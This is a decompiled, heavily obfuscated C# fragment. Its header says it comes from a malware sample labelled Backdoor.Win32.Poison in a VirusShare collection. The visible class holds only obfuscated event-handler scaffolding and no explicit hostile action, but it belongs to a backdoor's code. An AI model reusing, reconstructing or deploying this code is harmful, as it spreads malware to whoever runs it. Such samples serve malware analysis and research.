// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 5, Version=0.0.0.0, Culture=neutral, PublicKeyToken=c1ca78561cb11ead
// MVID: 2D47F565-522D-4F7E-99C5-0FAB4FA0B168
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.Poison.eqbg-1d1c34c3e9b902e7445301b77a51949865f13999db65bb166e4f7800abbf116b.exe

using \u0007;
using \u0008;
using \u000F;
using System;
using System.Runtime.InteropServices;

namespace \u0008
{
  internal abstract class \u0007
  {
    internal static bool \u0001;
    internal \u0006 \u0001;
    internal static readonly object \u0001;

    internal void \u0001([In] object obj0, [In] EventArgs obj1)
    {
      \u000E obj2;
      \u0003.\u0007 obj3;
      try
      {
        obj3 = \u0004.\u0001();
        if (\u0004.\u0001(obj3))
          return;
        obj2 = new \u000E(obj3);
        // ISSUE: method pointer
        \u0004.\u0001((\u0005) obj2, new \u0006((object) this, __methodptr(\u0001)));
        if (!this.\u0001())
          return;
        this.\u0001(obj2);
        \u0004.\u0001();
      }
      catch (Exception ex)
      {
        \u0003.\u0007 obj4 = obj3;
        \u000E obj5 = obj2;
        object obj6 = obj0;
        EventArgs eventArgs = obj1;
        \u0004.\u0001(ex, (object) obj4, (object) obj5, (object) this, obj6, (object) eventArgs);
        throw;
      }
    }

    protected abstract void \u0001([In] \u000E obj0);

    protected abstract bool \u0001();

    internal void \u0001([In] \u0003.\u0007 obj0)
    {
      \u000E obj1;
      try
      {
        if (false)
          return;
        obj1 = new \u000E(obj0);
        // ISSUE: method pointer
        \u0004.\u0001((\u0005) obj1, new \u0006((object) this, __methodptr(\u0001)));
        if (!this.\u0001())
          goto label_2;
label_1:
        \u001B\u0002.\u007E\u0086\u0003((object) \u0003\u0003.\u001C\u0004(), false);
        this.\u0001(obj1);
label_2:
        if (true)
          \u0004.\u0001();
        else
          goto label_1;
      }
      catch (Exception ex)
      {
        \u000E obj2 = obj1;
        \u0003.\u0007 obj3 = obj0;
        \u0004.\u0001(ex, (object) obj2, (object) this, (object) obj3);
        throw;
      }
    }

    static \u0007()
    {
      try
      {
        \u0008.\u0007.\u0001 = new object();
      }
      catch (Exception ex)
      {
        \u0004.\u0001(ex);
        throw;
      }
    }

    internal sealed class \u0001
    {
      public \u0003.\u0007 \u0001;
      public \u0008.\u0007 \u0001;
    }
  }
}
